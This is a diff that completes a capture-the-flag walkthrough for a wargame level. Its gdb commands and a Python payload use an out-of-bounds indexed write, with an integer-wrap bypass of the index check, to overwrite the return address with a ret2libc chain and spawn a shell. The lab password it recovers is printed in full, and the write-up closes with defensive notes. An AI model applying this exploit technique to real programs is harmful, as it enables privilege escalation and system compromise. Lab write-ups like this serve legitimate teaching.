@@ -3,17 +3,105 @@ Level 7 - Walkthrough
 
 1) Recon
 - Files discovered:
+	- `/home/users/level07/level07`
+	- local reconstruction notes in `code.c`
 - Useful commands used:
+	- `objdump -d /home/users/level07/level07`
+	- `gdb /home/users/level07/level07`
 
 2) Vulnerability confirmation
 - What is vulnerable:
+	- `data[index] = number` in `store_number()`
+	- `data[index]` in `read_number()`
 - Why it is exploitable:
+	- No upper-bounds validation on `index`
+	- Only weak filters (`index % 3`, `number >> 24 == 0xb7`)
+	- Enables out-of-bounds writes into `main` stack frame control data
 
 3) Exploitation steps
-- Exact command sequence:
-- Payload used:
+
+Step A - Find return-slot index in gdb:
+
+```bash
+gdb /home/users/level07/level07
+```
+
+```gdb
+b *0x080489cf
+run
+# type: quit
+set $data = $esp+0x24
+set $ret = $ebp+4
+p/x $data
+p/x $ret
+p/d ($ret-$data)/4
+p/d (($ret-$data)/4)%3
+```
+
+Observed values:
+- `data_base = 0xffffd554`
+- `ret_slot = 0xffffd71c`
+- `ret_idx_raw = 114`
+- `114 % 3 == 0` (blocked)
+
+Use wrapped index:
+- `ret_idx = 114 + 0x40000000 = 1073741938`
+
+Step B - Get runtime libc addresses:
+
+```gdb
+b main
+run
+p system
+p exit
+find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
+```
+
+Observed:
+- `system = 0xf7e6aed0`
+- `exit = 0xf7e5eb70`
+- `"/bin/sh" = 0xf7f897ec`
+
+Step C - Build return chain with `store`:
+
+```bash
+(python - <<'PY'
+SYSTEM = 0xf7e6aed0
+EXIT   = 0xf7e5eb70
+BINSH  = 0xf7f897ec
+RET_IDX = 1073741938
+
+def store(n, i):
+		return "store\n%d\n%d\n" % (n, i)
+
+payload  = store(SYSTEM, RET_IDX)  # saved RET -> system
+payload += store(EXIT, 115)         # return after system
+payload += store(BINSH, 116)        # arg1 for system
+payload += "quit\n"
+
+print payload,
+PY
+cat) | /home/users/level07/level07
+```
+
+Step D - In the resulting shell, read next password:
+
+```bash
+cat /home/users/level08/.pass
+```
+
+Payload used:
+- Out-of-bounds indexed stores with wrapped index bypass
+- Return-chain overwrite (`system`, `exit`, `/bin/sh` pointer)
 
 4) Result
 - Retrieved next password from:
-- Notes for defense/evaluation:
+	- `/home/users/level08/.pass`
+- Recovered value:
+	- `7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC`
+
+5) Notes for defense/evaluation:
+- Must enforce strict bounds: `if (index >= 100) reject;`
+- Canary alone is insufficient against indexed arbitrary writes.
+- Policy checks (`index % 3`, high-byte block) are bypassable and not a real memory safety control.
 
